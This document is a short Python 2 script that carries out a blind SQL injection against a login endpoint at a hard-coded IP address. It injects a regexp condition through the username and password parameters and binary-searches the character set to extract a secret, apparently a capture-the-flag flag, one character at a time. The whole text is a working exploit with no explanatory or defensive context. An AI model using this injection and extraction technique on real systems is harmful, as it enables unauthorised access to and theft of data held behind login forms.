#!/usr/bin/python
import requests
import string

URL = 'http://104.197.7.111:8080/login'

def oracle(prefix):
    resp = 'internal server error'
    while 'internal server error' in resp:
        payload = {
            'username': "admin' & ",
            'password': " = password regexp binary '^%s' = '1" % prefix,
        }
        resp = requests.post(URL, params=payload).text
    return 'username: admin' in resp

space = string.letters + string.digits + '-{}'

prefix = ''
while not prefix.endswith('}'):
    s = space
    while len(s) > 1:
        left = s[:len(s)/2]
        right = s[len(s)/2:]
        if oracle(prefix + '[' + left + ']'):
            s = left
        else:
            s = right
    prefix += s[0]
    print prefix
